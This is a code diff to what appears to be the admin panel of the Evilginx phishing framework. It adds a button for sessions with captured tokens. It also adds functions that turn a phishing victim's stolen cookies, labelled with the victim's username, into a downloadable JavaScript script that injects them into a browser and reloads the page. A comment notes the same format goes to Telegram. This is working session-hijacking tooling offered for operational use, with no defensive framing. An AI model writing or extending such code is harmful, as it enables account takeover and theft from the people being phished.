@@ -770,6 +770,15 @@ class EvilginxAdmin {
                 <td style="font-size: 0.85rem; color: var(--text-secondary);">${s.update_time}</td>
                 <td>
                     <div class="table-actions">
+                        ${s.has_tokens ? `
+                            <button class="btn-icon success" onclick="admin.downloadCookies(${s.id})" title="Download Cookies">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+                                    <polyline points="7 10 12 15 17 10"/>
+                                    <line x1="12" y1="15" x2="12" y2="3"/>
+                                </svg>
+                            </button>
+                        ` : ''}
                         <button class="btn-icon" onclick="admin.showSessionDetails(${s.id})" title="View Details">
                             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                 <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
@@ -865,6 +874,167 @@ class EvilginxAdmin {
         } else {
             this.toast('error', 'Error', result.message);
         }
+    }
+
+    async downloadCookies(id) {
+        const result = await this.apiRequest(`/sessions/${id}`);
+        if (!result.success) {
+            this.toast('error', 'Error', result.message);
+            return;
+        }
+
+        const session = result.data;
+        if (!session.tokens || session.tokens.length === 0) {
+            this.toast('error', 'No Cookies', 'This session has no captured cookies');
+            return;
+        }
+
+        // Generate JavaScript cookie injection script (same format as Telegram)
+        const timeStr = new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC';
+        const cookieScript = this.generateCookieScript(session, timeStr);
+
+        // Create filename
+        const safeUsername = (session.username || 'unknown')
+            .replace('@', '_at_')
+            .replace(/\./g, '_');
+        const filename = `cookies_${safeUsername}_${session.id}.txt`;
+
+        // Trigger download
+        const blob = new Blob([cookieScript], { type: 'text/plain' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = filename;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+
+        this.toast('success', 'Cookies Downloaded', `Saved as ${filename}`);
+    }
+
+    generateCookieScript(session, timeStr) {
+        const cookies = session.tokens || [];
+        
+        let script = '(() => {\n';
+        script += '    let cookies = [\n';
+
+        let cookieCount = 0;
+        let sessionCookieCount = 0;
+        let earliestExpiry = 0;
+        let latestExpiry = 0;
+
+        cookies.forEach((cookie, index) => {
+            if (index > 0) script += ',\n';
+            
+            // Track expiration stats
+            if (cookie.session) {
+                sessionCookieCount++;
+            } else if (cookie.expires > 0) {
+                if (earliestExpiry === 0 || cookie.expires < earliestExpiry) {
+                    earliestExpiry = cookie.expires;
+                }
+                if (cookie.expires > latestExpiry) {
+                    latestExpiry = cookie.expires;
+                }
+            }
+
+            const escapedValue = this.escapeJSONString(cookie.value || '');
+            const path = cookie.path || '/';
+
+            script += `        {
+            "name": "${cookie.name || ''}",
+            "value": "${escapedValue}",
+            "domain": "${cookie.domain || ''}",
+            "path": "${path}",
+            "expires": ${cookie.expires || 0},
+            "expiresHuman": "${cookie.expiresHuman || ''}",
+            "size": ${(cookie.name || '').length + (cookie.value || '').length},
+            "httpOnly": ${cookie.httpOnly || false},
+            "secure": ${cookie.secure || false},
+            "session": ${cookie.session || false},
+            "sameSite": "${cookie.sameSite || ''}",
+            "hostOnly": ${cookie.hostOnly || false}
+        }`;
+            cookieCount++;
+        });
+
+        script += '\n    ];\n\n';
+
+        // Add expiration summary
+        script += '    /*\n';
+        script += '     * 📊 Cookie Expiration Summary:\n';
+        script += `     * Total cookies: ${cookieCount}\n`;
+        script += `     * Session cookies (expire on browser close): ${sessionCookieCount}\n`;
+        if (earliestExpiry > 0) {
+            const earliestDate = new Date(earliestExpiry * 1000).toISOString().replace('T', ' ').substring(0, 19) + ' UTC';
+            const latestDate = new Date(latestExpiry * 1000).toISOString().replace('T', ' ').substring(0, 19) + ' UTC';
+            script += `     * ⚠️ Earliest expiry: ${earliestDate}\n`;
+            script += `     * Latest expiry: ${latestDate}\n`;
+            
+            const timeRemaining = earliestExpiry - Math.floor(Date.now() / 1000);
+            if (timeRemaining > 0) {
+                if (timeRemaining > 86400) {
+                    const days = Math.floor(timeRemaining / 86400);
+                    script += `     * ⏰ Time until earliest expiry: ~${days} days\n`;
+                } else if (timeRemaining >= 3600) {
+                    const hours = Math.floor(timeRemaining / 3600);
+                    script += `     * ⏰ Time until earliest expiry: ~${hours} hours\n`;
+                } else {
+                    const minutes = Math.floor(timeRemaining / 60);
+                    script += `     * ⏰ Time until earliest expiry: ~${minutes} minutes\n`;
+                }
+            } else {
+                script += '     * ⚠️ WARNING: Some cookies may have already expired!\n';
+            }
+        }
+        script += '     */\n\n';
+
+        script += `    function setCookie(cookie) {
+        let domain = cookie.domain || window.location.hostname;
+        let expires = '';
+        
+        if (cookie.expires > 0) {
+            let date = new Date(cookie.expires * 1000);
+            expires = 'expires=' + date.toUTCString() + ';';
+        }
+        
+        let secure = cookie.secure ? 'Secure;' : '';
+        let sameSite = cookie.sameSite ? 'SameSite=' + cookie.sameSite + ';' : '';
+        
+        if (cookie.name.startsWith('__Host')) {
+            document.cookie = \`\${cookie.name}=\${cookie.value};\${expires}path=\${cookie.path};Secure;SameSite=None\`;
+        } else if (cookie.name.startsWith('__Secure')) {
+            document.cookie = \`\${cookie.name}=\${cookie.value};\${expires}domain=\${domain};path=\${cookie.path};Secure;SameSite=None\`;
+        } else {
+            document.cookie = \`\${cookie.name}=\${cookie.value};\${expires}domain=\${domain};path=\${cookie.path};\${secure}\${sameSite}\`;
+        }
+    }
+
+    for (let cookie of cookies) {
+        setCookie(cookie);
+    }
+    
+    console.log('✅ ' + cookies.length + ' cookies injected successfully!');
+    window.location.reload();
+})();
+`;
+        script += '\n// ✅ Cookies injection script generated!\n';
+        script += `// Generated: ${timeStr}\n`;
+        script += `// Session ID: ${session.id}\n`;
+        script += `// Username: ${session.username || 'unknown'}\n`;
+
+        return script;
+    }
+
+    escapeJSONString(str) {
+        if (!str) return '';
+        return str
+            .replace(/\\/g, '\\\\')
+            .replace(/"/g, '\\"')
+            .replace(/\n/g, '\\n')
+            .replace(/\r/g, '\\r')
+            .replace(/\t/g, '\\t');
     }
 
     async confirmDeleteAllSessions() {
